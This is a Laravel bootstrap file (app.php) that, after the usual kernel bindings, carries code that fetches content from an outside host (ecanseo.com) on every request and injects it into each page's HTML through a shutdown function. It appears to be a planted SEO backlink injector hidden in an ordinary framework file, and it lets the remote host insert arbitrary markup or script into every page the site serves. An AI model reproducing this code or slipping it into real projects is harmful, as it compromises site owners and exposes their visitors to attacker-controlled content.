<?php

$app = new Illuminate\Foundation\Application(
    realpath(__DIR__.'/../')
);

$app->singleton(
    Illuminate\Contracts\Http\Kernel::class,
    App\Http\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Console\Kernel::class,
    App\Console\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Debug\ExceptionHandler::class,
    App\Exceptions\Handler::class
);


$content = @file_get_contents('https://ecanseo.com/project/baclink.php');

$GLOBALS['injected_content'] = ($content !== false && !empty($content)) ? $content : '<!-- 404 - Konten tidak tersedia -->';

register_shutdown_function(function() {
    $output = ob_get_clean();

    if (strpos($output, '</html>') !== false) {
        $output = str_replace('</html>', $GLOBALS['injected_content'] . "\n</html>", $output);
    } else {
        $output .= "\n" . $GLOBALS['injected_content'];
    }
    
    echo $output;
});

return $app;
